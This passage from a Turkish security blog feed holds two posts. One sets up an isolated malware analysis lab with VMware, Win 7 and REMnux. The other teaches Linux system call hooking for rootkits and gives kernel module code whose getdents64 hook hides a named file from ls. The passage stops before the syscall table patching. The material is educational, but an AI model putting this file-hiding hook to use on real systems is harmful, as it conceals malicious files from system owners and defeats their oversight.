&lt;p&gt;Bu part içerisinde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Analiz&lt;/strong&gt;‘ini yapacağımız &lt;strong&gt;Lab&lt;/strong&gt;‘ı oluşturacağız.&lt;/p&gt;

&lt;p&gt;Teknik konulara ileriki partlarda değineceğiz. Şimdi &lt;strong&gt;Lab&lt;/strong&gt;‘imizi kurmaya geçelim yavaştan.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; kelimesine daha önce denk gelmeyen arkadaşlar için &lt;strong&gt;Twitter&lt;/strong&gt;‘de denk geldiğim bir arkadaşın blog yazısını bırakıyorum buraya :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://uae-ii.blogspot.com/2019/02/kotu-amacl-yazlm-nam-diger-malware.html&quot;&gt;Blog yazısı&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Lab&lt;/strong&gt; için ben &lt;strong&gt;VMware&lt;/strong&gt; kullanacağım &lt;strong&gt;sanal makine&lt;/strong&gt; olarak.&lt;/p&gt;

&lt;p&gt;Ayrıca ben bir &lt;strong&gt;Portable Executable&lt;/strong&gt;‘ın analizini yapacağımdan &lt;strong&gt;Win 7&lt;/strong&gt; kurdum test makinesi olarak.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9Za9V.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bunun dışında birde &lt;strong&gt;Malware&lt;/strong&gt;‘nin :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;HTTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;HTTPS&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;SMTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;POP3&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;FTP&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Protokolleri&lt;/strong&gt; gibi ağ üzerinde gerçekleştirdiği &lt;strong&gt;request&lt;/strong&gt;‘leri dinleyeceğimiz ve &lt;strong&gt;Win 7&lt;/strong&gt;‘nin &lt;strong&gt;gateway&lt;/strong&gt;‘i olarak kullanacağımız &lt;strong&gt;Tersine Mühendis&lt;/strong&gt;‘leri ve &lt;strong&gt;Malware 
Analist&lt;/strong&gt;‘leri için özel geliştirilmiş &lt;strong&gt;REMnux&lt;/strong&gt;‘u kullanacağım.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9Za9r.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Eğer &lt;strong&gt;işletim sistem&lt;/strong&gt;‘lerinde tamamsak şayet şimdi &lt;strong&gt;Network Configuration&lt;/strong&gt; kısmımıza geçmeden önce biraz &lt;strong&gt;Statik&lt;/strong&gt;, &lt;strong&gt;Dinamik&lt;/strong&gt;, &lt;strong&gt;Snapshot&lt;/strong&gt; ve &lt;strong&gt;Malware&lt;/strong&gt; anahtar kelimelerinden bahsedelim.&lt;/p&gt;

&lt;h1 id=&quot;dynamic-vs-static-analysis&quot;&gt;Dynamic vs Static Analysis&lt;/h1&gt;

&lt;p&gt;Örnek veriyorum elimizde bir &lt;strong&gt;Portable Executable&lt;/strong&gt; yani çalıştırılabilir bir dosyamız var &lt;strong&gt;Malware&lt;/strong&gt; olarak. Bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan ne yaptığını anlamak &lt;strong&gt;Statik Analiz&lt;/strong&gt; ile mümkün. Anlatmaya devam etmeden önce &lt;strong&gt;Statik&lt;/strong&gt; ve &lt;strong&gt;Dinamik&lt;/strong&gt; analizlerinin neler olduklarına bir bakalım.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Static Analysis&lt;/strong&gt;&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan incelemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Disassemble&lt;/strong&gt; edip içerisinde bulunduğu instructionları gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;İçerdiği &lt;strong&gt;Library&lt;/strong&gt; ve &lt;strong&gt;Function&lt;/strong&gt;‘ları görüntülemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;İçerdiği &lt;strong&gt;String&lt;/strong&gt;‘leri görüntülemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edildimi edilmedimi &lt;strong&gt;PEid&lt;/strong&gt; gibi bir tool ile test etmek&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://uldissprogis.files.wordpress.com/2016/01/static-analysis-dynamic-analysis.jpg?w=640&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Dynamic Analysis&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘yi çalışırken incelemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Bir &lt;strong&gt;Debugger&lt;/strong&gt; aracılığı ile içerisindeki instructionları gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Bir &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinde &lt;strong&gt;Snapshot&lt;/strong&gt; aldıktan sonra çalıştırıp &lt;strong&gt;Etkisini&lt;/strong&gt; gözlemleyip eski &lt;strong&gt;Snapshot&lt;/strong&gt;‘a geri dönmek&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘i çalıştırmadan önce &lt;strong&gt;RegShot&lt;/strong&gt; gibi bir tool ile &lt;strong&gt;Registry&lt;/strong&gt;‘nin &lt;strong&gt;Shot&lt;/strong&gt;‘unu alıp &lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonraki &lt;strong&gt;Registry&lt;/strong&gt; ile karşılaştırmak&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonra &lt;strong&gt;REMnux&lt;/strong&gt; gibi bir &lt;strong&gt;İşletim Sistemi&lt;/strong&gt; içerisinden &lt;strong&gt;Malware&lt;/strong&gt;‘nin gerçekleştirdiği &lt;strong&gt;Protocol Request&lt;/strong&gt;‘lerini gözlemlemek&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Tabi bu yukarıda saydıklarımız sadece bir kaçı. İleride bazılarını daha detaylı inceleyeceğimizden şimdilik sadece kafanızda &lt;strong&gt;Dinamik&lt;/strong&gt; ve &lt;strong&gt;Statik&lt;/strong&gt; analizlerinin neler olduklarına dair bir şema oluşması için yukarıda ekleme yaptım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dinamik Analiz&lt;/strong&gt; bize &lt;strong&gt;Malware&lt;/strong&gt;‘yi anlamamız açısından daha iyi yardımcı olacaktır &lt;strong&gt;Yüzeysel&lt;/strong&gt; olarak.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt; çalıştırdığımız &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinden asıl makinemize ulaşmaya çalışıyor olması bile muhtemel olabilir.&lt;/p&gt;

&lt;p&gt;Bu yüzden bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırdıktan sonra ne olursa olsun bizim &lt;strong&gt;Ana Makinemize&lt;/strong&gt; dokunmayacağından hem &lt;strong&gt;Network&lt;/strong&gt; hemde &lt;strong&gt;VM Escape&lt;/strong&gt; açısından korunaklı olduğumuzdan emin olmamız lazım.&lt;/p&gt;

&lt;p&gt;Bu açıdan &lt;strong&gt;Ağ&lt;/strong&gt;‘ımızı asıl makinemize ulaşılamayacak şekilde düzenlememiz yani &lt;strong&gt;Host&lt;/strong&gt;‘tan &lt;strong&gt;İzole&lt;/strong&gt; etmemiz ve &lt;strong&gt;Sanal Makine&lt;/strong&gt;‘nin bir &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu almamız gerekiyor.&lt;/p&gt;

&lt;h1 id=&quot;virtual-network-and-snapshot&quot;&gt;Virtual Network and Snapshot&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Snapshot&lt;/strong&gt; nedir ? :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Makine&lt;/strong&gt;‘mizin alınmış bir kopyasıdır. &lt;strong&gt;Malware&lt;/strong&gt; çalıştıktan sonra &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinde &lt;strong&gt;Kırılmalar&lt;/strong&gt; oluşabilir bu yüzden tekrar eski haline getirmek için bir &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu almamız gereklidir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;VMware&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Sanal Makinemiz&lt;/strong&gt; için bir &lt;strong&gt;Snapshot&lt;/strong&gt; alalım :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/r5qM5N.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Snapshot&lt;/strong&gt;‘umuzu aldığımıza göre şimdi &lt;strong&gt;Network Configuration&lt;/strong&gt; kısmına geçebiliriz.&lt;/p&gt;

&lt;p&gt;Bu kısımı görsel ile anlatmak biraz uzun sürebilir bu yüzden hem &lt;strong&gt;REMnux&lt;/strong&gt; hemde &lt;strong&gt;Win 7&lt;/strong&gt; için &lt;strong&gt;Ağ&lt;/strong&gt; ayarlarını yaptığım ve nasıl yapıldığını anlattım.&lt;/p&gt;

&lt;p&gt;Ayrıca bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Protocol Request&lt;/strong&gt;‘lerini canlı olarak nasıl izlendiğini anlattığım videoma alıyım sizleri :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/oCO3xsIktng&quot;&gt;Network Visulation &amp;amp; Malware Request Track Youtube Vid&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;video-hakkında&quot;&gt;Video hakkında&lt;/h1&gt;

&lt;p&gt;Bu videoda kullandığım &lt;strong&gt;inetsim&lt;/strong&gt;, &lt;strong&gt;fakedns&lt;/strong&gt; gibi toollar bize sahte protocol sunucuları oluşturdu.&lt;/p&gt;

&lt;p&gt;Video içerisinde anlattığım &lt;strong&gt;Route Traffic&lt;/strong&gt; olayıda basit bir şekilde bilgisayarı ve interneti olan bir kişi &lt;strong&gt;Google&lt;/strong&gt;‘ye girmek isterse bu trafik &lt;strong&gt;Gateway&lt;/strong&gt;‘inden geçer ve bu gateway ancak izin verirse istediği yere ulaşabilir &lt;strong&gt;Google&lt;/strong&gt;‘ye girmek isteyen kişi.&lt;/p&gt;

&lt;p&gt;Bizde normal bir &lt;strong&gt;Gateway&lt;/strong&gt; kullanmak yerine &lt;strong&gt;Win 7&lt;/strong&gt; için &lt;strong&gt;Gateway&lt;/strong&gt; olarak &lt;strong&gt;REMnux&lt;/strong&gt;‘umuzu kullandık.&lt;/p&gt;

&lt;p&gt;Dolayısıyla &lt;strong&gt;Win 7&lt;/strong&gt; içerisinde geçen tüm &lt;strong&gt;Request&lt;/strong&gt;‘ler bizim &lt;strong&gt;REMnux&lt;/strong&gt;‘umuz içerisine yönlendirildi.&lt;/p&gt;

&lt;p&gt;Bu şekilde de &lt;strong&gt;Malware&lt;/strong&gt;‘mizin internet üzerinde yaptığı tüm istekleri izleyebilir hale geldik.&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Malware Analysis&lt;/strong&gt; serimizin ilk part’ını umarım keyifle okumuşsunuzdur.&lt;/p&gt;

&lt;p&gt;İlerideki partlarda &lt;strong&gt;Static&lt;/strong&gt; ve &lt;strong&gt;Dynamic&lt;/strong&gt; analizlere deyineceğim.&lt;/p&gt;

&lt;p&gt;Ve dahada ileriki partlarda dahada teknik detaylara gireceğiz.&lt;/p&gt;

&lt;p&gt;Sağlıcakla Kalın !&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis (Part 1)</summary></entry><entry><title type="html">Linux System Call Hooking</title><link href="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html" rel="alternate" type="text/html" title="Linux System Call Hooking" /><published>2019-05-07T00:00:00+03:00</published><updated>2019-05-07T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/07/linux-system-call-hooking.html">&lt;h1 id=&quot;linux-system-call-hooking&quot;&gt;Linux System Call Hooking&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Linux System Call Hooking&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımda sizlere türkçe adı ile &lt;strong&gt;Sistem Çağrısı Kancalama&lt;/strong&gt;‘yı anlatacağım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt; nedir kısmına gelmeden önce &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin &lt;strong&gt;System Call Hooking&lt;/strong&gt;‘i neden sıklıkla kullandığını anlatayım.&lt;/p&gt;

&lt;p&gt;Örneğin düşünelim ki bir &lt;strong&gt;Rootkit&lt;/strong&gt; yazdık ve bu &lt;strong&gt;Rootkit&lt;/strong&gt;‘in sistem içerisinde kendini gizlemesi lazım zaten &lt;strong&gt;rootkit&lt;/strong&gt;‘lerin en büyük gereksinimlerinden biri kendini gizlemesi.&lt;/p&gt;

&lt;p&gt;Diyelim ki &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında &lt;strong&gt;Rootkit&lt;/strong&gt;‘imiz gösterilmesin istiyoruz. Bunun için bizim &lt;strong&gt;ls&lt;/strong&gt; komutunun içerisindeki &lt;strong&gt;System Call&lt;/strong&gt;‘leri &lt;strong&gt;Hook&lt;/strong&gt; edip &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştığında gelen liste içerisinde bizim komutumuzu gizlemek.&lt;/p&gt;

&lt;p&gt;İlerideki kısımlarda basitce bunu yapacağız ama ondan önce &lt;strong&gt;System Call&lt;/strong&gt; kavramının ne olduğunu öğrenelim.&lt;/p&gt;

&lt;p&gt;Aklınızda ingilizce olarak kalmasını istediğimden buradaki terimleri ingilizce kullanarak devam edicem anlatmaya.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini aşşağıda ki resimden anlatmaya başlayalım yavaşca :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.cs.uregina.ca/Links/class-info/330-bkup/SystemCall_IO/System_Calls.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Öncelike bizim &lt;strong&gt;Executable&lt;/strong&gt;‘ımız &lt;strong&gt;Library Functions&lt;/strong&gt;‘a gider program içerisinde kullanılacak fonksiyonları almak için yada direk olarak &lt;strong&gt;System call&lt;/strong&gt;‘larına başvurur resimde de görebildiğiniz gibi.&lt;/p&gt;

&lt;p&gt;Ayrıca resimde ki okları takip edersek şayet bu &lt;strong&gt;System Call&lt;/strong&gt;‘ların &lt;strong&gt;Kernel&lt;/strong&gt;‘e sonrasında ise &lt;strong&gt;Hardware&lt;/strong&gt;‘e bağlandığını gözlemleyebiliriz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerin neler olduğunu soracak olursanız aşşağıda bir kaçını listeleyen bir resim bırakıyorum. Tüm sistem çağrılarına yani &lt;strong&gt;System Call&lt;/strong&gt;‘lara ulaşmak istiyorsanız resmin üstüne de fotorafı aldığım web siteyi bırakacağım.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://syscalls.kernelgrok.com/&quot;&gt;Linux Syscall Reference&lt;/a&gt;
&lt;img src=&quot;https://i.hizliresim.com/MVO54g.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yani daha basite indirge edersek şayet &lt;strong&gt;System Call&lt;/strong&gt;‘leri bir program içerisinde kullandığımız örneğin &lt;strong&gt;printf&lt;/strong&gt; gibi bir &lt;strong&gt;Library Function&lt;/strong&gt;‘unun sistem’e uyarlanmış halidir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call&lt;/strong&gt;‘lerini anladığımıza göre &lt;strong&gt;Hooking&lt;/strong&gt; terimine geçebiliriz. Bu terimi daha önce yazdığım blogum olan &lt;a href=&quot;https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html&quot;&gt;Linux Function Hooking&lt;/a&gt; içerisinde anlattım o yüzden bu blogumda anlatmıyacağım.&lt;/p&gt;

&lt;p&gt;Şimdi gelelim bilalin topu kaleye nasıl soktuğuna, pardon pardon bu başka konuydu… yine karıştırdım.&lt;/p&gt;

&lt;p&gt;Gelelim &lt;strong&gt;System Call&lt;/strong&gt;‘lerinin nasıl &lt;strong&gt;Hook&lt;/strong&gt; edildiğine.&lt;/p&gt;

&lt;p&gt;Aslında bu konuda daha önce anlattığım &lt;strong&gt;Function Hooking&lt;/strong&gt;‘e çok benzer bir konu. Aralarında ki bir kaç fark birinin &lt;strong&gt;User-mode&lt;/strong&gt; içerisinde bu yazının ise &lt;strong&gt;Kernel-mode&lt;/strong&gt; içerisinde geçmesi.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/GmdQVV.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buraya birde &lt;strong&gt;User-mode&lt;/strong&gt; ve &lt;strong&gt;Kernel-mode&lt;/strong&gt; arasındaki farkları anlatan bir stackoverflow çözümünü bırakıyorum : &lt;a href=&quot;https://stackoverflow.com/questions/1311402/what-is-the-difference-between-user-and-kernel-modes-in-operating-systems&quot;&gt;User vs Kernel&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-call-trace&quot;&gt;System Call Trace&lt;/h1&gt;

&lt;p&gt;Şayet bir &lt;strong&gt;Executable&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;System Call&lt;/strong&gt;‘leri yakalamak ve incelemek istiyorsak linux içerisinde bulunan &lt;strong&gt;strace&lt;/strong&gt; komutumuz bize çok yardımcı olacaktır.&lt;/p&gt;

&lt;p&gt;Nasıl çalıştığını bilmeyen arkadaşlar için buraya &lt;strong&gt;strace&lt;/strong&gt; komutunu anlatan bir yazı bırakıyorum : &lt;a href=&quot;https://www.tecmint.com/strace-commands-for-troubleshooting-and-debugging-linux/&quot;&gt;Strace&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;ls-komutunu-hook-etme&quot;&gt;LS komutunu hook etme&lt;/h1&gt;

&lt;p&gt;Öncelik ile &lt;strong&gt;ls&lt;/strong&gt; komutunun hangi &lt;strong&gt;System Call&lt;/strong&gt;‘lerini içerdiğini görmek için &lt;strong&gt;strace&lt;/strong&gt; komutunu kullanıyoruz ve çıktımız şu şekilde oluyor :&lt;/p&gt;

&lt;p&gt;Biraz uzun olduğu için pastebin’e ekledim çıktıyı : &lt;a href=&quot;https://pastebin.com/fRjDHF2T&quot;&gt;Strace çıktısı&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu çıktının içerisinde gözümüze çarpan bir sürü &lt;strong&gt;System Call&lt;/strong&gt; mevcut olan ve dizin girişlerini alan &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı ilgimizi çekiyor ve &lt;a href=&quot;http://man7.org/linux/man-pages/man2/getdents.2.html&quot;&gt;man page&lt;/a&gt;‘ini incelediğimizde görebiliriz ki :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int getdents(unsigned int fd, struct linux_dirent *dirp,
                unsigned int count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4 adet argüman alıyor ama bu argümanların içerisinde bir &lt;strong&gt;structure&lt;/strong&gt; yani bir yapı olan &lt;strong&gt;linux_dirent64&lt;/strong&gt; diğerlerinden farklı olarak &lt;strong&gt;ls&lt;/strong&gt; komutu çalıştıktan sonra gelen listeyi döndürüyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	offsetof(struct linux_dirent, d_name)) */
	/*
	char pad;       // Zero padding byte
	char d_type;    // File type (only since Linux
	// 2.6.4); offset is (d_reclen - 1)
	*/
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ayrıca man page içerisinde bu &lt;strong&gt;System Call&lt;/strong&gt;‘ın &lt;strong&gt;readdir.c&lt;/strong&gt; içerisinde kullanıldığını görebiliyoruz.&lt;/p&gt;

&lt;p&gt;Artık bundan sonrası &lt;strong&gt;LKM&lt;/strong&gt; yani &lt;strong&gt;Loadable Kernel Module&lt;/strong&gt; development’e giriyor ve bunun ne olduğunu bilmeyen arkadaşlarımız varsa aramızda onlar içinde bir yazı yazdım.&lt;/p&gt;

&lt;p&gt;Buradan ulaşabilirsiniz : &lt;a href=&quot;https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html&quot;&gt;Loadable Kernel Module Development&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;system-call-hooking-i̇çin-lkm-geliştirmek&quot;&gt;System Call Hooking İçin LKM Geliştirmek&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Strace&lt;/strong&gt; komutunu kullanıp &lt;strong&gt;ls&lt;/strong&gt; içerisinden &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısını incelersek şayet:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ strace ls 2&amp;gt;&amp;amp;1 | grep getdents64
getdents64(3, /* 30 entries */, 32768)  = 960
getdents64(3, /* 0 entries */, 32768)   = 0
deadbeef@pop-os:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;30 adet entry olduğunu görebiliriz bulunduğumuz klasör içerisinde. Doğrulamak için de &lt;strong&gt;wc&lt;/strong&gt; komutunu kullanabiliriz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;deadbeef@pop-os:~$ ls -la | wc -l
30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi elde ettiğimiz tüm bu bilgiler ile &lt;strong&gt;LKM&lt;/strong&gt;‘mizi geliştirmeye başlayalım yavaştan.&lt;/p&gt;

&lt;p&gt;Bu kısımı çok basit anlatacağım aramızda anlamakta zorlanan arkadaşlar olur diye.&lt;/p&gt;

&lt;p&gt;Ve tam anlatmaya başlarken kız arkadaşım kabus görüp kalkıyor.&lt;/p&gt;

&lt;p&gt;Evet onu yatıştırdıktan sonra yazıya devam edebilirim.&lt;/p&gt;

&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/init.h&amp;gt;
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/moduleparam.h&amp;gt;
#include &amp;lt;linux/unistd.h&amp;gt;
#include &amp;lt;linux/semaphore.h&amp;gt;
#include &amp;lt;linux/dirent.h&amp;gt;
#include &amp;lt;asm/cacheflush.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sonrasında yazacağımız &lt;strong&gt;LKM&lt;/strong&gt;‘nin detaylarını girelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MODULE_AUTHOR(&quot;blacknbunny&quot;);
MODULE_DESCRIPTION(&quot;LS Komutundan cokgizlidosya.txt yi gizlemek&quot;);
MODULE_LICENSE(&quot;GPL&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;İleride daha detaylı anlatacağım &lt;strong&gt;sys_call_table&lt;/strong&gt; :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void **sys_call_table;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;LS&lt;/strong&gt; komutundan saklayacağımız dosya :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define DOSYA_ISMI &quot;cokgizlidosya.txt&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Orjinal &lt;strong&gt;getdents64&lt;/strong&gt; sistem çağrısı :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu orjinal sistem çağrısı yerine bizim aktaracağımız hookumuz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
        int returnval;
        struct linux_dirent64 *cur = dirp;
        int i = 0;
        returnval = org_getdents64(fd, dirp, count);
        while (i &amp;lt; returnval) {
                if (strncmp(cur-&amp;gt;d_name, DOSYA_ISMI, strlen(DOSYA_ISMI)) == 0) {
                        int reclen = cur-&amp;gt;d_reclen;
                        char *next_rec = (char *)cur + reclen;
                        int len = (int)dirp + returnval - (int)next_rec;
                        memmove(cur, next_rec, len);
                        returnval -= reclen;
                        continue;
                }
                i += cur-&amp;gt;d_reclen;
                cur = (struct linux_dirent*) ((char*)dirp + i);
        }
        return returnval;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tüm bilgileri toplayıp birleştirdikten sonra bu hooku yazdım.&lt;/p&gt;

&lt;p&gt;Hooku basitce açıklayacak olursam. &lt;strong&gt;linux_dirent64&lt;/strong&gt; &lt;strong&gt;struct&lt;/strong&gt;‘u üzerinde bir döngü oluşturduk ve her bir dosya ismini aradık.&lt;/p&gt;

&lt;p&gt;Bizim belirttiğimiz gizlenilecek dosya ile aynı ismi taşıyorsa bunu &lt;strong&gt;ls&lt;/strong&gt; komutunda gösterme dedik.&lt;/p&gt;

&lt;h1 id=&quot;system-call-table&quot;&gt;System Call Table&lt;/h1&gt;
&lt;p&gt;Şimdi geldik değirmenin döndüğü yere.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;System Call Table&lt;/strong&gt; yani &lt;strong&gt;sys_call_table&lt;/strong&gt; kernelin içerdiği tüm sistem çağrılarını tutar. Aynı zamanda &lt;strong&gt;hafıza&lt;/strong&gt; yani &lt;strong&gt;memory&lt;/strong&gt; içerisinde nerede olduğunu bize gösterir.&lt;/p&gt;

